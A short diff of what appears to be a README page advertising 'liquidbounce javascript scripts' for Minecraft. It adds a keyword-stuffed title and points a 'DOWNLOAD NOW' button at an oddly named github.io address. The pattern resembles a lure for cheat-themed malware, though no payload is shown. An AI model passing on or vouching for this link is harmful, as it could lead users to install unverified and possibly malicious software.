@@ -1,10 +1,10 @@
-
+# download liquidbounce javascript scripts for PC | working latest version liquidbounce javascript scripts. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( https://minecraft-sigma-50-cli-sr36.github.io/.github/) |
  |---------------------|----------------------:|
 
 
